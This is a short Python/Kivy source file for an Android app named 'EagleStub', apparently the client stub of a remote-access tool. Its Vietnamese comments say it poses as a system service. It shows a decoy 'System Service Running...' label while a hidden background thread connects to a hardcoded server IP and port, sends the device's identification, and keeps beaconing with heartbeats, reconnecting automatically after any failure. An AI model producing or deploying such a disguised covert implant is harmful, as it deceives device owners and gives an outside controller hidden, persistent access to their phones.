from kivy.app import App
from kivy.uix.label import Label
import socket
import threading
import time
import platform

# Cấu hình - HÃY THAY IP NÀY BẰNG IP MÁY TÍNH CỦA BẠN
SERVER_IP = "192.168.1.9" 
PORT = 7771

class EagleStub(App):
    def build(self):
        # Chạy kết nối trong một luồng riêng để không làm treo ứng dụng
        threading.Thread(target=self.stay_connected, daemon=True).start()
        
        # Giao diện đơn giản giả danh ứng dụng hệ thống
        return Label(text="System Service Running...", font_size='20sp')

    def stay_connected(self):
        while True:
            try:
                # Khởi tạo kết nối
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((SERVER_IP, PORT))
                
                # Gửi thông tin định danh ban đầu
                info = f"ANDROID | {platform.machine()} | OS: {platform.system()}"
                s.send(info.encode('utf-8'))

                while True:
                    # Gửi "nhịp tim" để Server biết máy vẫn online và nhảy số Upload/Download
                    heartbeat = b"PING"
                    s.send(heartbeat)
                    
                    # Chờ phản hồi từ Server
                    data = s.recv(1024)
                    if not data:
                        break
                    
                    time.sleep(5) # Gửi mỗi 5 giây
            except Exception as e:
                # Nếu mất kết nối, chờ 10 giây rồi thử lại tự động
                time.sleep(10)
            finally:
                try: s.close()
                except: pass

if __name__ == "__main__":
    EagleStub().run()